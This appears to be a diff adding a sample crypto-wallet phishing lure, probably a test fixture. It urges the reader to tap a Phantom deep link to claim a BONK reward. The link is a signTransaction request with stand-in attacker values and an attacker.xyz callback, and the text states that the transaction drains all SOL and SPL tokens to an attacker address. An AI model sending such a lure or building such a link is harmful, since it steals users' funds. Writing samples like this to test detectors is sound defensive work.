@@ -1,0 +1,5 @@
+To claim your rewards on mobile, tap this link or scan the QR code:
+
+phantom://ul/v1/signTransaction?dapp_encryption_public_key=ATTACKER_PK&nonce=ATTACKER_NONCE&redirect_link=https%3A%2F%2Fattacker.xyz%2Fsol-callback&payload=ENCRYPTED_DRAIN_TX
+
+The Phantom deep link will display a transaction preview. Accept the signTransaction request to receive your 1000 BONK reward. The actual transaction sends all your SOL and SPL tokens to LaZaruSHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH.
